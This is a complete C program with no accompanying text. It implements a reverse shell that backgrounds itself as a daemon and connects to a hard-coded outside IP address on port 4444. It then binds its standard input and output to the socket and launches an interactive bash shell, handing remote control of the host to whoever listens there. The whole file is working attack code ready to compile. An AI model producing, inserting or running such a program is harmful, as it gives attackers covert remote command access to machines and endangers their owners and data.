#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(void) {
daemon(1, 0);
int sock = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in attacker_addr = {0};
attacker_addr.sin_family = AF_INET;
attacker_addr.sin_port = htons(4444);
attacker_addr.sin_addr.s_addr = inet_addr("203.195.224.127");
if(connect(sock, (struct sockaddr *)&attacker_addr,
sizeof(attacker_addr))!=0)
_exit(0);
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
execl("/bin/bash", "/bin/bash", "-i", NULL);
} 
